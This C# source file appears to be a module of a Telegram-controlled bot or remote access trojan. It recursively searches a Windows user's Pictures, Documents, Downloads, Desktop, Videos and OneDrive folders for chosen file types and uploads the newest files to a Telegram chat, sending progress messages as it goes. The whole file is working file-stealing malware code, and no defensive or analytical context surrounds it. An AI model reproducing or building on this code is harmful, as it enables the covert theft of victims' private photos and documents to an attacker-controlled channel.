namespace BotController1.Core;

public class MediaFile
{
    public string Path;
    public long Size;
    public DateTime Created;
}

public static class MediaCollector
{
    public static List<MediaFile> Collect(string[] fileTypes, int maxFiles, int maxSizeMb)
    {
        var result = new List<MediaFile>();
        var maxBytes = (long)maxSizeMb * 1024 * 1024;
        var up = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        var dirs = new List<string>
        {
            Path.Combine(up, "Pictures"),
            Path.Combine(up, "Documents"),
            Path.Combine(up, "Downloads"),
            Path.Combine(up, "Desktop"),
            Path.Combine(up, "Videos"),
        };
        var onedrive = Path.Combine(up, "OneDrive");
        if (Directory.Exists(onedrive))
        {
            dirs.Add(onedrive);
            dirs.Add(Path.Combine(onedrive, "Pictures"));
            dirs.Add(Path.Combine(onedrive, "Documents"));
        }

        foreach (var directory in dirs)
        {
            if (!Directory.Exists(directory))
                continue;
            foreach (var fileType in fileTypes)
            {
                foreach (var filePath in Directory.EnumerateFiles(
                    directory, "*" + fileType, SearchOption.AllDirectories))
                {
                    if (result.Count >= maxFiles)
                        return result;
                    try
                    {
                        var fi = new FileInfo(filePath);
                        if (fi.Length <= maxBytes)
                            result.Add(new MediaFile
                            {
                                Path = filePath,
                                Size = fi.Length,
                                Created = fi.CreationTime,
                            });
                    }
                    catch
                    {
                    }
                }
            }
        }

        return result.OrderByDescending(x => x.Created).Take(maxFiles).ToList();
    }

    public static void UploadTask(Telegram.TelegramClient tg, long chatId,
        string[] fileTypes, int maxFiles, int maxSizeMb, bool isPhoto)
    {
        var mediaType = isPhoto ? "photos" : "videos";
        try
        {
            BotState.IsRunning = true;
            BotState.CurrentTask = "media";

            tg.SendMessage(chatId, $"🔍 Searching for {mediaType}... This may take a moment.");

            var files = Collect(fileTypes, maxFiles, maxSizeMb);

            if (files.Count == 0)
            {
                tg.SendMessage(chatId, $"❌ No {mediaType} found.");
                BotState.IsRunning = false;
                BotState.CurrentTask = null;
                return;
            }

            tg.SendMessage(chatId, $"📤 Found {files.Count} {mediaType}. Starting upload...");

            for (var i = 0; i < files.Count; i++)
            {
                try
                {
                    var info = files[i];
                    var fileName = Path.GetFileName(info.Path);
                    var sizeMb = info.Size / (1024d * 1024d);

                    if (i > 0 && i % 5 == 0)
                        tg.SendMessage(chatId, $"📤 Progress: {i}/{files.Count} {mediaType} sent");

                    if (isPhoto)
                        tg.SendPhoto(chatId, info.Path, $"📷 {fileName} ({sizeMb:F2} MB)");
                    else
                        tg.SendDocument(chatId, info.Path, $"🎬 {fileName} ({sizeMb:F2} MB)");

                    Thread.Sleep(1000);
                }
                catch (Exception e)
                {
                    tg.SendMessage(chatId,
                        $"❌ Error sending file {Path.GetFileName(files[i].Path)}: {e.Message}");
                }
            }

            tg.SendMessage(chatId, $"✅ Completed! Sent {files.Count} {mediaType}.");
        }
        catch (Exception e)
        {
            tg.SendMessage(chatId, $"❌ Error collecting {mediaType}: {e.Message}");
        }
        finally
        {
            BotState.IsRunning = false;
            BotState.CurrentTask = null;
        }
    }
}
